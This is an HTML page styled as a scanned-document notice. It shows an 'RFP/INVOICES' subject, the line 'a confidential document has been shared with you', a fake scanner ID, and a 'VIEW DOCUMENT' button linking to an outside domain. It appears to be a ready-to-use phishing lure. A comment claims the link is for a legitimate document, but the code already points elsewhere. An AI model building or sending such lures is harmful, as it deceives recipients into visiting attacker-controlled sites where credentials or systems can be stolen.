<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Scanned Document Notification</title>

<style>
* {
    box-sizing: border-box;
}

html, body {
    margin: 0;
    padding: 0;
    min-height: 100%;
}

body {
    background: #eeeeee;
    font-family: "Courier New", Courier, monospace;
    color: #333333;
    padding: 32px 20px;
}

.document {
    width: min(1100px, 100%);
    margin: 0 auto;
    background: #ffffff;
    box-shadow: 0 8px 30px rgba(0,0,0,0.10);
    border: 1px solid #dddddd;
}

/* Header */
.header {
    background: #244b7d;
    color: #ffffff;
    height: 84px;
    display: flex;
    align-items: center;
    padding: 0 38px;
}

.menu {
    width: 38px;
    margin-right: 24px;
}

.menu span {
    display: block;
    height: 4px;
    background: #ffffff;
    margin: 7px 0;
}

.header-title {
    font-size: 22px;
    font-weight: bold;
    letter-spacing: 4px;
}

/* Main content */
.content {
    padding: 58px 9%;
}

.label {
    color: #999999;
    font-size: 16px;
    letter-spacing: 5px;
    margin-bottom: 22px;
}

.subject {
    font-size: 28px;
    font-weight: bold;
    line-height: 1.35;
    margin: 0;
}

.divider {
    height: 2px;
    background: #dddddd;
    margin: 40px 0;
}

.message {
    font-size: 21px;
    line-height: 1.6;
    margin-bottom: 42px;
}

/* Information table */
.info-table {
    width: 100%;
    border-collapse: collapse;
    margin-bottom: 42px;
}

.info-table td {
    border: 1px solid #cccccc;
    padding: 17px 22px;
    font-size: 18px;
}

.info-table td:first-child {
    width: 31%;
    font-weight: bold;
    color: #555555;
}

/* Button */
.button-container {
    text-align: center;
    margin: 30px 0 40px;
}

.document-button {
    display: inline-block;
    background: #244b7d;
    color: #ffffff;
    text-decoration: none;
    font-size: 17px;
    font-weight: bold;
    letter-spacing: 3px;
    padding: 20px 42px;
    border-radius: 2px;
}

.document-button:hover {
    background: #1d3e68;
}

/* Footer */
.footer-line {
    height: 2px;
    background: #dddddd;
}

.footer {
    text-align: center;
    color: #aaaaaa;
    font-size: 13px;
    padding: 24px 10px 30px;
}

/* Mobile */
@media (max-width: 700px) {

    body {
        padding: 12px;
    }

    .header {
        height: 68px;
        padding: 0 20px;
    }

    .menu {
        width: 30px;
        margin-right: 15px;
    }

    .menu span {
        height: 3px;
        margin: 5px 0;
    }

    .header-title {
        font-size: 15px;
        letter-spacing: 2px;
    }

    .content {
        padding: 38px 7%;
    }

    .label {
        font-size: 12px;
        letter-spacing: 3px;
    }

    .subject {
        font-size: 21px;
    }

    .divider {
        margin: 28px 0;
    }

    .message {
        font-size: 17px;
        margin-bottom: 30px;
    }

    .info-table td {
        padding: 13px 12px;
        font-size: 15px;
    }

    .info-table td:first-child {
        width: 38%;
    }

    .document-button {
        width: 100%;
        padding: 18px 10px;
        font-size: 14px;
        letter-spacing: 2px;
    }
}
</style>
</head>

<body>

<div class="document">

    <header class="header">
        <div class="menu">
            <span></span>
            <span></span>
            <span></span>
        </div>

        <div class="header-title">
            SCANNED DOCUMENT NOTIFICATION
        </div>
    </header>

    <main class="content">

        <div class="label">SUBJECT</div>

        <h1 class="subject">
            RFP/INVOICES
        </h1>

        <div class="divider"></div>

        <p class="message">
            A confidential document has been shared with you.
        </p>

        <table class="info-table">
            <tr>
                <td>Scanned from</td>
                <td>MLA19111280RFP-08312022</td>
            </tr>
        </table>

        <div class="button-container">

            <!-- Replace # ONLY with the URL of the legitimate document you control -->
            <a
                class="document-button"
                href="https://arcomplianceservices.help"
                target="_blank"
                rel="noopener noreferrer"
            >
                VIEW DOCUMENT
            </a>

        </div>

        <div class="footer-line"></div>

        <div class="footer">
            Document notification page
        </div>

    </main>

</div>

</body>
</html>
